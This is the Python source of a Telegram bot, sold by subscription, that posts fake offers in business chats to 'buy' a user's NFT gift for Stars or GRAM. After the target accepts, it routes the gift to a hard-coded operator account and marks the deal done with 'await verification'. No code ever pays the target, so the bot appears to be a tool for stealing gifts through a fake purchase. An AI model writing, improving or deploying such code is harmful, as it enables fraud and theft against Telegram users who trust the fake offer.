# -*- coding: utf-8 -*-
import html, json, os, re, sqlite3, sys, threading, time
import urllib.error, urllib.request
from contextlib import contextmanager

BOT_TOKEN = os.environ["BOT_TOKEN"]
ADMIN_IDS = {int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip()}
SELLER    = os.environ.get("SELLER", "@zh0rix")
MY_ID     = int(os.environ.get("MY_ID", "8247562061"))

API = f"https://api.telegram.org/bot{BOT_TOKEN}/"

DB_PATH = os.environ.get("DB_PATH") or (
    "/data/offers.sqlite3" if os.path.isdir("/data")
    else os.path.join(os.path.dirname(os.path.abspath(__file__)), "offers.sqlite3")
)
os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)

E_OK, E_DECLINE = "5409029658794537988", "5893081007153746175"
E_STARS = "5848259999763011021"

WEBAPP_URL = "https://samadepstejnovic-dotcom.github.io/Nft-api/"

BUY_TEXT = f"🔒 <b>Купите подписку у {SELLER}</b>\n\n<i>Доступ активируется после оплаты</i>"

OFFERS = {}
LOCK = threading.Lock()
OPENER = urllib.request.build_opener()

def log(*a):
    print(time.strftime("%H:%M:%S"), *a, flush=True)

@contextmanager
def db():
    c = sqlite3.connect(DB_PATH, timeout=30)
    try:
        yield c
        c.commit()
    finally:
        c.close()

def db_init():
    with db() as c:
        c.execute("""CREATE TABLE IF NOT EXISTS offers(
            chat_id INTEGER, message_id INTEGER, bc TEXT, link TEXT,
            title TEXT, price INTEGER, cur TEXT, deadline INTEGER,
            status TEXT, buyer TEXT, created INTEGER,
            hint_id INTEGER DEFAULT 0, buyer_id INTEGER DEFAULT 0,
            PRIMARY KEY(chat_id, message_id))""")
        c.execute("""CREATE TABLE IF NOT EXISTS users(
            user_id INTEGER PRIMARY KEY, until INTEGER, added INTEGER)""")

    with db() as c:
        rows = c.execute(
            "SELECT chat_id,message_id,bc,link,title,price,cur,deadline,"
            "status,buyer,created,hint_id,buyer_id "
            "FROM offers WHERE status IN ('pending','accepted')"
        ).fetchall()
    cols = ["chat_id","message_id","bc","link","title","price","cur","deadline",
            "status","buyer","created","hint_id","buyer_id"]
    now = int(time.time())
    restored = 0
    with LOCK:
        for row in rows:
            o = dict(zip(cols, row))
            if o["deadline"] and o["deadline"] < now and o["status"] == "pending":
                continue
            OFFERS[(o["chat_id"], o["message_id"])] = o
            restored += 1
    log(f"Восстановлено сделок из БД: {restored}")

def db_put(o):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO offers VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?)",
                  (o["chat_id"], o["message_id"], o["bc"], o["link"], o["title"],
                   o["price"], o["cur"], o["deadline"], o["status"], o["buyer"],
                   o["created"], o["hint_id"], o["buyer_id"]))

def api(method: str, **params):
    body = json.dumps(params, ensure_ascii=False).encode("utf-8")
    req = urllib.request.Request(API + method, data=body,
                                 headers={"Content-Type": "application/json"})
    try:
        with OPENER.open(req, timeout=30) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        log("api err:", method, e)
        return {"ok": False}

def send(chat_id, text, bc=None, kb=None, reply_to=None):
    p = {"chat_id": chat_id, "text": text, "parse_mode": "HTML",
         "link_preview_options": {"prefer_large_media": True, "show_above_text": True}}
    if bc: p["business_connection_id"] = bc
    if kb: p["reply_markup"] = kb
    if reply_to: p["reply_parameters"] = {"message_id": reply_to}
    return api("sendMessage", **p)

def edit(chat_id, msg_id, text, kb, bc):
    p = {"chat_id": chat_id, "message_id": msg_id, "text": text,
         "parse_mode": "HTML",
         "link_preview_options": {"prefer_large_media": True, "show_above_text": True}}
    if bc: p["business_connection_id"] = bc
    if kb: p["reply_markup"] = kb
    return api("editMessageText", **p)

def delete_msg(chat_id, msg_id, bc):
    if not msg_id: return
    if bc: api("deleteBusinessMessages", business_connection_id=bc, message_ids=[msg_id])
    else:  api("deleteMessage", chat_id=chat_id, message_id=msg_id)

def has_access(uid) -> bool:
    if not uid: return False
    if uid in ADMIN_IDS: return True
    with db() as c:
        row = c.execute("SELECT until FROM users WHERE user_id=?", (uid,)).fetchone()
    return bool(row and row[0] > int(time.time()))

def grant(uid, days):
    until = int(time.time()) + days * 86400
    with db() as c:
        c.execute("INSERT OR REPLACE INTO users(user_id,until,added) VALUES(?,?,?)",
                  (uid, until, int(time.time())))
    return until

def revoke(uid):
    with db() as c:
        c.execute("DELETE FROM users WHERE user_id=?", (uid,))

def card_text(o):
    ic = f'<tg-emoji emoji-id="{E_STARS}">⭐</tg-emoji>' if o["cur"] == "stars" else "GRAM"
    hidden_link = f'<a href="{o["link"]}">\u200b</a>'
    creator = f"@{o['buyer']}" if o['buyer'] else "Пользователь"

    if o["status"] == "pending":
        return (f"{hidden_link}"
                f"{creator} предлагает {o['price']} {ic} за {o['title']}.\n\n"
                f"Получатель NFT: {SELLER}\n\n"
                f"Действует 6 часов.")
    if o["status"] == "accepted":
        return (f"{hidden_link}"
                f"✅ <b>Сделка подтверждена.</b>\n\n"
                f"Передайте {o['title']} покупателю, чтобы получить {o['price']} {ic}.\n\n"
                f"Получатель NFT: {SELLER}")
    return f"{hidden_link}✅ <b>Сделка закрыта.</b>\n\n{o['title']} — {o['price']} {ic}"

def kb_pending():
    return {"inline_keyboard": [[
        {"text": "Отклонить", "callback_data": "o:decline"},
        {"text": "Принять",   "callback_data": "o:accept"}
    ]]}

def kb_accepted(buyer_id):
    link = f"tg://send_gift?to={MY_ID}"
    return {"inline_keyboard": [
        [{"text": "Передать подарок", "url": link}],
        [{"text": "Я отправил подарок", "callback_data": "o:confirm"}]
    ]}

def on_callback(cb):
    data, msg = cb.get("data", ""), cb.get("message") or {}
    chat_id, msg_id = (msg.get("chat") or {}).get("id"), msg.get("message_id")

    with LOCK:
        o = OFFERS.get((chat_id, msg_id))

    if not o:
        return api("answerCallbackQuery", callback_query_id=cb["id"],
                   text="Устарело", show_alert=True)

    if o["status"] == "pending" and o["deadline"] < int(time.time()):
        o["status"] = "done"; db_put(o)
        edit(chat_id, msg_id, "⌛️ <b>Сделка истекла.</b>", None, o["bc"])
        with LOCK: OFFERS.pop((chat_id, msg_id), None)
        return api("answerCallbackQuery", callback_query_id=cb["id"],
                   text="Время истекло", show_alert=True)

    if data == "o:accept":
        o["status"] = "accepted"; db_put(o)
        edit(chat_id, msg_id, card_text(o), kb_accepted(o.get("buyer_id", 0)), o["bc"])
        api("answerCallbackQuery", callback_query_id=cb["id"], text="Сделка подтверждена")
    elif data == "o:decline":
        o["status"] = "done"; db_put(o)
        edit(chat_id, msg_id, "❌ <b>Сделка отменена.</b>", None, o["bc"])
        api("answerCallbackQuery", callback_query_id=cb["id"], text="Отклонено")
        with LOCK: OFFERS.pop((chat_id, msg_id), None)
    elif data == "o:confirm":
        o["status"] = "done"; db_put(o)
        edit(chat_id, msg_id, "✅ <b>Подарок отправлен.</b>\nОжидайте проверки.", None, o["bc"])
        api("answerCallbackQuery", callback_query_id=cb["id"], text="Отправлено")
        with LOCK: OFFERS.pop((chat_id, msg_id), None)
        for adm in ADMIN_IDS:
            send(adm, f"⚠️ Покупатель нажал 'Я отправил подарок'\nNFT: {o['link']}")

def on_business_message(m):
    text = (m.get("text") or "").strip()
    bc = m.get("business_connection_id")
    chat_id, msg_id = m["chat"]["id"], m["message_id"]

    if text.startswith(".buy"):
        user = m.get("from") or {}
        uid = user.get("id", 0)
        username = user.get("username", "")

        if not has_access(uid):
            send(chat_id, BUY_TEXT, bc=bc)
            delete_msg(chat_id, msg_id, bc)
            return

        parts = text.split()
        if len(parts) < 3:
            return
        link = parts[1]
        cur = "gram" if "gram" in text.lower() else "stars"
        raw = re.sub(r'[^\d]', '', text.replace(link, ''))
        price = int(raw) if raw else 100

        title_parts = link.split('/')[-1].split('-')
        if len(title_parts) >= 2:
            title = f"{title_parts[0]} #{title_parts[-1]}"
        else:
            title = link.split('/')[-1]

        o = dict(chat_id=chat_id, message_id=0, bc=bc, link=link, title=title,
                 price=price, cur=cur, deadline=int(time.time()) + 6 * 3600,
                 status="pending", buyer=username, created=int(time.time()),
                 hint_id=0, buyer_id=uid)

        res = send(chat_id, card_text(o), bc=bc, kb=kb_pending())
        if res.get("ok"):
            o["message_id"] = res["result"]["message_id"]
            with LOCK: OFFERS[(chat_id, o["message_id"])] = o
            db_put(o)
            delete_msg(chat_id, msg_id, bc)

def on_private(m):
    text = (m.get("text") or "").strip()
    chat_id = m["chat"]["id"]
    uid = (m.get("from") or {}).get("id")
    is_admin = uid in ADMIN_IDS

    if text in ("/start", "/app"):
        kb = {"inline_keyboard": [[{"text": "🚀 Открыть Mini App",
                                    "web_app": {"url": WEBAPP_URL}}]]}
        return send(chat_id, "Привет! Это панель управления сделками. Нажми на кнопку ниже.", kb=kb)

    if text.startswith("/give"):
        if not is_admin: return send(chat_id, "Нет доступа")
        args = text.split()
        if len(args) < 3: return send(chat_id, "Формат: <code>/give ID ДНЕЙ</code>")
        try: target, days = int(args[1]), int(args[2])
        except ValueError: return send(chat_id, "ID и дни должны быть числами")
        grant(target, days)
        return send(chat_id, f"✅ Доступ для <code>{target}</code> выдан на {days} дн.")

    if text.startswith("/take"):
        if not is_admin: return send(chat_id, "Нет доступа")
        args = text.split()
        if len(args) < 2: return send(chat_id, "Формат: <code>/take ID</code>")
        try: target = int(args[1])
        except ValueError: return send(chat_id, "ID должен быть числом")
        with db() as c:
            res = c.execute("SELECT user_id FROM users WHERE user_id=?", (target,)).fetchone()
            if res:
                c.execute("DELETE FROM users WHERE user_id=?", (target,))
                return send(chat_id, f"🚫 Доступ для <code>{target}</code> успешно забран.")
        return send(chat_id, f"⚠️ Пользователь <code>{target}</code> не найден.")

    if text == "/subs":
        if not is_admin: return send(chat_id, "Нет доступа")
        with db() as c:
            rows = c.execute("SELECT user_id, until FROM users WHERE until > ?",
                             (int(time.time()),)).fetchall()
        if not rows: return send(chat_id, "📭 Активных подписок нет.")
        txt = "👥 <b>Активные подписки:</b>\n\n"
        for u, t in rows:
            txt += f"• <code>{u}</code> — до {time.strftime('%d.%m.%Y %H:%M', time.localtime(t))}\n"
        return send(chat_id, txt)

def expiry_worker():
    while True:
        try:
            now = int(time.time())
            expired = []
            with LOCK:
                for key, o in list(OFFERS.items()):
                    if o["status"] == "pending" and o["deadline"] < now:
                        expired.append(o)
                        OFFERS.pop(key, None)
            for o in expired:
                o["status"] = "done"; db_put(o)
                edit(o["chat_id"], o["message_id"],
                     "⌛️ <b>Сделка истекла (6 часов).</b>", None, o["bc"])
            if expired:
                log(f"Авто-закрыто сделок: {len(expired)}")
        except Exception as e:
            log("expiry err:", e)
        time.sleep(60)

def main():
    db_init()
    threading.Thread(target=expiry_worker, daemon=True).start()
    log("=== БОТ ЗАПУЩЕН ===")
    log(f"DB_PATH={DB_PATH}")

    offset = 0
    while True:
        try:
            res = api("getUpdates", offset=offset, timeout=25,
                      allowed_updates=["business_message", "callback_query", "message"])
            if res.get("ok"):
                for upd in res.get("result", []):
                    offset = upd["update_id"] + 1
                    try:
                        if "business_message" in upd:
                            on_business_message(upd["business_message"])
                        elif "callback_query" in upd:
                            on_callback(upd["callback_query"])
                        elif "message" in upd:
                            msg = upd["message"]
                            if "web_app_data" in msg:
                                try:
                                    data = json.loads(msg["web_app_data"]["data"])
                                except Exception:
                                    data = {}
                                if data.get("action") == "create":
                                    fake_m = {
                                        "text": f".buy {data.get('link','')} {data.get('price',100)} {data.get('cur','stars')}",
                                        "chat": msg["chat"],
                                        "message_id": msg["message_id"],
                                        "from": msg["from"],
                                        "business_connection_id": None,
                                    }
                                    on_business_message(fake_m)
                            else:
                                on_private(msg)
                    except Exception as e:
                        log("err handler:", e)
            else:
                time.sleep(3)
        except Exception as e:
            log("loop err:", e)
            time.sleep(5)

if __name__ == "__main__":
    main()
